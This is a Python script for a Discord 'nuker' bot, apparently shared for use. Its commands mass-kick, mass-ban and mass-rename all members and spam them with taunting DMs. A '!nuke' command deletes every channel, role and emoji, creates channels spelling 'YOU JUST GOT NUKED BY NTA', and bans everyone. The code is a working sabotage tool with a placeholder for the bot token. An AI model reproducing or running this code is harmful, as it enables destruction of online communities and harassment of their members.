import discord
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
import time
import random
intents = discord.Intents(messages=True, guilds=True, members=True)
# Imports the needed libs.

client = commands.Bot(command_prefix='!', intents=intents)
# Sets prefix and intents

client.remove_command("help")

@client.event
async def on_ready():
    print ("Nuker by Qatar974 & UHB Started")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.command(pass_context=True)
async def help(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.red()
    )

    embed.set_author(name="You're about to get fucked lol")
    embed.add_field(name='!kick', value='Kicks every member in a server', inline=False)
    embed.add_field(name='!ban', value='Bans every member in a server', inline=False)
    embed.add_field(name='!name', value='Use like this !name John', inline=False)
    embed.add_field(name='!msg', value='Messages every member in a server', inline=False)
    embed.add_field(name='!nuke', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
    await member.send(embed=embed)


@client.command(pass_context=True)
async def kick(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
            print (f"{member.name} has not been kicked")
        print ("Action completed: Kick all")


@client.command(pass_context=True)
async def ban(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")


@client.command(pass_context=True)
async def name(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")


@client.command(pass_context=True)
async def msg(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            await member.send("YOU JUST GOT NUKED BY NTA#7274")
        except:
            pass
        print("Action completed: Message all")


@client.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            await member.send("YOU JUST GOT NUKED BY NTA#7274")
        except:
            pass
        print("Action completed: Message all")
   
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("YOU")
        channel = await guild.create_text_channel("JUST")
        channel = await guild.create_text_channel("GOT")
        channel = await guild.create_text_channel("NUKED")
        channel = await guild.create_text_channel("BY")
        channel = await guild.create_text_channel("NTA")
        await channel.send("You can cry in my Dm's **NTA#7274**")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Server Wrecked")
# Enter Server Token here
client.run("")
